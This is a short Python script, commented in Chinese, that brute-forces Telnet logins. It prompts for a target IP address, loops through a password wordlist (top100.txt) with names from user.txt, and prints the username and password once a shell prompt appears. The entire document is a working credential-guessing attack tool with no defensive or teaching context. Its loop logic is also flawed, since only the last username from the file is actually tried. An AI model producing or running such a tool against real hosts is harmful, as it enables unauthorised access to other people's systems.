import telnetlib
Host = input('请输入你要暴力破解Telnet的ip地址:')
def telnet(username,Password):
    try:
        demo = telnetlib.Telnet(Host,timeout=5)
        demo.set_debuglevel(2)
        demo.read_until(b'ubuntu login: ')
        demo.write((username + '\n').encode('ascii'))
        while True:
            test = str(demo.read_some())
            if 'Password: ' in test:
                demo.write((Password + '\n').encode('ascii'))
            elif 'Login incorrect:' in test:
                print('失败')
                return False
            elif '$' in test:
                print('暴力破解成功，信息如下.')
                return True
    except:
        pass

username=open('user.txt')
for demo1 in username:
    username=demo1.strip()
Password =open('top100.txt')
for demo2 in Password:
    Password = demo2.strip()
    print (username + ':'+Password)
    demo2 = telnet(username,Password)
    if demo2:
        print ('username=' + username)
        print ('password=' + Password)
        break
